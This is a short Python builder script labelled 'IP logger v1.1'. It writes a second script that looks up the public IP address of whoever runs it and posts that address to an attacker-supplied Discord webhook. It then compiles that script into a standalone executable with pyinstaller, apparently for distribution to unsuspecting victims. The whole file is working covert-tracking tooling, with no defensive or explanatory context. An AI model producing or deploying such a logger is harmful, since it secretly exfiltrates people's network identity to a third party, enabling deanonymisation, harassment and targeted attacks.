import os
print("IP logger v1.1\nMade by 4Bytes#9688\n---------------------------------------------------------------------")
webhook = open("webhook.txt","r")
cool2 = open("namehere.py","w")
cool2.write(f'''
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
ip = get("https://api.ipify.org/")
msg = DiscordWebhook(url="{webhook.read()}",content="**New IP detected!**")
msg2 = DiscordEmbed(title="Info",description="`IP: " + ip.text + "`",color=111111)
msg.add_embed(msg2)
ok = msg.execute()
''')
cool2.close()
print("Created an IP logger | Check the dist folder!")
os.system("pyinstaller namehere.py --onefile")